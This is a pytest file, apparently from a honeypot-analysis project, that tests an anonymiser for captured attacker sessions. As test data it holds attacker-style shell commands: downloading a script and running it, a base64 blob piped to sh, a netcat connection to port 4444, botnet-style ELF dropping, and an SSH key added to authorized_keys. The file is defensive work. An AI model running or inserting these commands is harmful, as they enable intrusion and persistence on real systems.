"""Tests for making the evaluation set safe to commit.

Two properties carry the weight. Nothing identifying survives; and nothing a
classifier depends on is lost, because an anonymiser that changes a
classifier's answer would change the evaluation without anyone noticing.
"""

from __future__ import annotations

import pytest

from honeypot_ai.classify import rules
from honeypot_ai.classify.facts import SessionFacts
from honeypot_ai.label.anonymise import Anonymiser

# Real-looking public addresses for the tests to remove. These are genuine
# public ranges on purpose: the documentation ranges are what the anonymiser
# writes, so a test written with them could not tell success from failure.
PUBLIC_A = "8.8.8.8"
PUBLIC_B = "1.1.1.1"


def facts(*commands: str, urls: tuple[str, ...] = ()) -> SessionFacts:
    return SessionFacts(session_id="s", commands=commands, download_urls=urls)


# --- Addresses -------------------------------------------------------------


def test_a_public_address_becomes_a_documentation_address() -> None:
    out = Anonymiser().text(f"wget http://{PUBLIC_A}/x.sh")
    assert PUBLIC_A not in out
    assert "http://198.51.100.1/x.sh" in out


def test_the_same_address_gets_the_same_placeholder_everywhere() -> None:
    """Otherwise two sessions fetching from one server stop looking related."""
    anonymiser = Anonymiser()
    first = anonymiser.text(f"wget http://{PUBLIC_A}/a")
    second = anonymiser.text(f"curl {PUBLIC_A}/b; wget {PUBLIC_B}/c")

    assert "198.51.100.1/a" in first
    assert "198.51.100.1/b" in second
    assert "198.51.100.2/c" in second


@pytest.mark.parametrize(
    "address",
    ["127.0.0.1", "0.0.0.0", "10.0.0.5", "192.168.1.1", "172.16.0.9"],  # noqa: S104
)
def test_private_and_loopback_addresses_are_left_alone(address: str) -> None:
    """They identify nobody, and rewriting them changes what a session means."""
    assert Anonymiser().text(f"ping {address}") == f"ping {address}"


def test_something_that_only_looks_like_an_address_is_left_alone() -> None:
    assert Anonymiser().text("echo 999.1.1.1") == "echo 999.1.1.1"


def test_a_port_does_not_stop_the_address_being_found() -> None:
    out = Anonymiser().text(f"nc {PUBLIC_A}:4444")
    assert PUBLIC_A not in out
    assert "198.51.100.1:4444" in out


def test_a_public_ipv6_address_is_replaced_and_loopback_is_not() -> None:
    anonymiser = Anonymiser()
    assert "2606:4700::1111" not in anonymiser.text("ping6 2606:4700::1111")
    assert anonymiser.text("ping6 ::1") == "ping6 ::1"


def test_download_urls_are_anonymised_as_well_as_commands() -> None:
    out = Anonymiser().facts(facts("wget x", urls=(f"http://{PUBLIC_A}/x",)))
    assert PUBLIC_A not in out.download_urls[0]


def test_hostnames_are_kept() -> None:
    """Attacker infrastructure, and the ordinary currency of threat intel."""
    assert "evil.example" in Anonymiser().text("wget http://evil.example/x")


# --- Payloads typed in as text ---------------------------------------------

ELF_CHUNK = r'echo -ne "\x7F\x45\x4C\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00" > .d'


def test_a_long_hex_payload_is_cut_to_its_first_bytes() -> None:
    out = Anonymiser().text(ELF_CHUNK)
    assert r"\x7F\x45\x4C\x46" in out  # the ELF magic, recognisable
    assert r"\x01\x01\x01\x61" not in out  # and nothing after it
    assert "+12 bytes sha256:" in out


def test_a_short_hex_marker_is_left_intact() -> None:
    """`echo -e "\\x6F\\x6B"` is a liveness probe, not a payload."""
    probe = r'echo -e "\x6F\x6B"'
    assert Anonymiser().text(probe) == probe


def test_a_long_base64_blob_is_cut() -> None:
    blob = "A" * 200
    out = Anonymiser().text(f"echo {blob} | base64 -d | sh")
    assert blob not in out
    assert "+184 chars sha256:" in out


def test_a_sha256_written_in_a_command_is_left_intact() -> None:
    digest = "a" * 64
    assert digest in Anonymiser().text(f"sha256sum -c {digest}")


# --- The invariant the evaluation depends on -------------------------------


@pytest.mark.parametrize(
    "commands",
    [
        (ELF_CHUNK, "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"),
        (r'echo -e "\x6F\x6B"',),
        (r'echo -e "\x47\x41\x59\x46\x47\x54"',),
        # Eight bytes: the one marker long enough to be truncated, and so the
        # one that proves truncation keeps enough for the rule to match.
        (r'echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"',),
        (f"cd /tmp; wget http://{PUBLIC_A}/bins/x.sh; chmod 777 x.sh; sh x.sh",),
        ('cd ~ && mkdir .ssh && echo "ssh-rsa ' + "A" * 300 + '" >> .ssh/authorized_keys',),
        ("uname -a", "cat /proc/cpuinfo", "nproc"),
        ("enable", "system", "shell", "sh"),
    ],
)
def test_anonymising_never_changes_what_the_rules_conclude(commands: tuple[str, ...]) -> None:
    raw = facts(*commands)
    safe = Anonymiser().facts(raw)

    before, after = rules.classify(raw), rules.classify(safe)
    assert after.intent is before.intent
    assert after.behaviours == before.behaviours
